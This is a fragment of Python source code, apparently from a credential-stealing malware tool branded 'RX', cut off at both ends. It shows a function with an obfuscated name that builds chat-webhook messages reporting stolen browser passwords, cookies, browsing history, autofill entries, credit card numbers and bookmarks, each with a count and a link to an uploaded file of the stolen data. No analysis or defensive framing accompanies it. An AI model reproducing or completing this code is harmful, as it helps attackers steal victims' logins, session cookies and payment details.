...
def G378r0W53r5(br0W53rP47H5):
    ...
    data = {
        ...
        "embeds": [
            {
                "title": f"RX | Password RX",
                "description": f"**Found**:\n{G37W3851735(p45WW0rDs)}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P455WC0UNt}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [RX_Passwords.txt]({filess[0]})",
                "color": 2895667,
                "footer": {"text": f"RX",  
                "icon_url": "https://i.ibb.co/fdFfLznd/images.png"}
            },
            {
                "title": f"RX | Cookies RX",
                "description": f"**Found**:\n{G37W3851735(c00K1W0rDs)}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{C00K1C0UNt}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [RX_Cookies.txt]({filess[1]})",
                "color": 2895667,
                "footer": {"text": f"RX",  
                "icon_url": "https://i.ibb.co/fdFfLznd/images.png"}
            },
            {
                "title": f"RX | Browser Data",
                "description": f":newspaper:  • **{H1570rYC0UNt}** Histories Found\n<a:CH_IconArrowRight:715585320178941993> • [RX_Histories.txt]({filess[4]})\n\n<a:hira_kasaanahtari:886942856969875476> • **{AU70F111C0UNt}** Autofills Found\n<a:CH_IconArrowRight:715585320178941993> • [RX_Autofills.txt]({filess[3]})\n\n<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> • **{CC5C0UNt}** Credit Cards Found\n<a:CH_IconArrowRight:715585320178941993> • [RX_CreditCards.txt]({filess[2]})\n\n:bookmark: • **{B00KM4rK5C0UNt}** Bookmarks Found\n<a:CH_IconArrowRight:715585320178941993> • [RX_Bookmarks.txt]({filess[5]})",
                "color": 2895667,
                "footer": {"text": f"RX",  
                "icon_url": "https://i.ibb.co/fdFfLznd/images.png"}
            }
